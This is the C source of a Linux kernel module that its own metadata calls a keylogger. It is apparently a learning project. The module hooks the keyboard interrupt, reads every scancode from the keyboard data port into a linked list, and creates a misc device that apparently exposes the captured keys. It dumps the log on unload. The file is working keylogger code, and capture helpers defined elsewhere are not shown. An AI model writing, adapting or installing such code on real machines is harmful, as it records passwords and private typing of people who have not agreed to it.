#include "./keyboard.h"

MODULE_AUTHOR("SegFault42 <SegFault42@protonmail.com>");
MODULE_DESCRIPTION("keylogger");
MODULE_LICENSE("GPL");

extern t_key			*first;
struct mutex			lock;

static irqreturn_t	keyboard(int irq, void *dev_id)
{
	unsigned char	scancode;

	scancode = inb(KBD_DATA_REG);

	// check if is valid entry
	if (strlen(key_name[scancode]) != 0)
		add_tail(scancode);

	return IRQ_HANDLED;
}

static int __init	keyboard_init(void)
{
	pr_info("Keylogger ON\n");

	//init mutex
	mutex_init(&lock);

	create_misc();

	return request_irq(KBD_IRQ, keyboard, IRQF_SHARED, "key_logger", (void *)keyboard);
}

static void __exit	keyboard_exit(void)
{
	print_log();

	// free and destroy
	free_lst();
	free_irq(KBD_IRQ, (void *)keyboard);
	destroy_misc();
	pr_info("Keylogger OFF\n");
}

module_init(keyboard_init);
module_exit(keyboard_exit);
